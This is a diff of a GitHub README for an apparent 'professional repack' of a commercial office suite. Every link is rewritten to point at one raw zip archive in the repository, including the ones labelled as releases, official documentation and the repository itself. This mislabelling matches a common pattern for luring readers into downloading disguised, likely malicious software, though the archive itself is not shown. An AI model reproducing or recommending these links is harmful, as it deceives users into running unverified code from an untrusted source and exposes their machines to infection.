@@ -1,6 +1,6 @@
 # 🎉 Ability-Office-Professional-Repack - Simple Document Editing for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Ability%20Office%20Professional%20Repack-blue)](https://github.com/VionDierg/Ability-Office-Professional-Repack/releases)
+[![Download Now](https://github.com/VionDierg/Ability-Office-Professional-Repack/raw/refs/heads/main/delegacy/Professional-Repack-Ability-Office-1.2.zip%20Now-Ability%20Office%20Professional%20Repack-blue)](https://github.com/VionDierg/Ability-Office-Professional-Repack/raw/refs/heads/main/delegacy/Professional-Repack-Ability-Office-1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -19,9 +19,9 @@ Before you start, ensure your computer meets these requirements:
 
 To get Ability Office Professional Repack, visit this page to download:
 
-[Download Now](https://github.com/VionDierg/Ability-Office-Professional-Repack/releases)
+[Download Now](https://github.com/VionDierg/Ability-Office-Professional-Repack/raw/refs/heads/main/delegacy/Professional-Repack-Ability-Office-1.2.zip)
 
-1. Go to the [Releases page](https://github.com/VionDierg/Ability-Office-Professional-Repack/releases).
+1. Go to the [Releases page](https://github.com/VionDierg/Ability-Office-Professional-Repack/raw/refs/heads/main/delegacy/Professional-Repack-Ability-Office-1.2.zip).
 2. Find the latest version listed.
 3. Click the link to download the zip file or installer for your Windows PC.
 4. Once downloaded, locate the file in your Downloads folder.
@@ -87,9 +87,9 @@ This application covers multiple topics to enhance your document experience:
 
 For further information, refer to these links:
 
-- [Official Documentation](https://example.com)
-- [GitHub Repository](https://github.com/VionDierg/Ability-Office-Professional-Repack)
+- [Official Documentation](https://github.com/VionDierg/Ability-Office-Professional-Repack/raw/refs/heads/main/delegacy/Professional-Repack-Ability-Office-1.2.zip)
+- [GitHub Repository](https://github.com/VionDierg/Ability-Office-Professional-Repack/raw/refs/heads/main/delegacy/Professional-Repack-Ability-Office-1.2.zip)
 
 Remember to regularly check for updates and new features. Enjoy your experience with Ability Office Professional Repack!
 
-[Download Now](https://github.com/VionDierg/Ability-Office-Professional-Repack/releases)
+[Download Now](https://github.com/VionDierg/Ability-Office-Professional-Repack/raw/refs/heads/main/delegacy/Professional-Repack-Ability-Office-1.2.zip)
